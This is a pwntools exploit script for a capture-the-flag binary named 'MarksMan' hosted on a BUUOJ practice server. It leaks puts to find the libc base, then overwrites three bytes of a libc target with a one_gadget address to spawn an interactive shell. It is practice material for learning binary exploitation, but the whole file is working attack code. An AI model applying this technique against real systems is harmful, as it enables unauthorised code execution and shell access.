#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./MarksMan')
	elf = ELF('./MarksMan',checksec=False)
	libc = ELF('./libc.so.6',checksec=False)
else:
	p = remote('node3.buuoj.cn',29366)
	elf = ELF('./MarksMan',checksec=False)
	libc = ELF('./libc.so.6',checksec=False)

###get libc###
ru("I placed the target near: ")
puts = int(rv(14),16)

libc_base = puts - libc.symbols['puts']
success('libc base:'+hex(libc_base))
pause()
target = libc_base + 0x3EB0A8

###get one_gadget###
one_gadget = libc_base + 0x0E585F

one_gadget_list = [0,0,0]

one_gadget_list[0] = one_gadget % 0x100
one_gadget_list[1] = (one_gadget // 0x100) % 0x100
one_gadget_list[2] = (one_gadget // 0x10000) % 0x100

success(hex(one_gadget_list[0])+'---'+hex(one_gadget_list[1])+'---'+hex(one_gadget_list[2]))

###get shell###
ru('shoot!shoot!\n')
sl(str(target))

for i in range(3):
    ru('biang!\n')
    sl(chr(one_gadget_list[i]))

ia()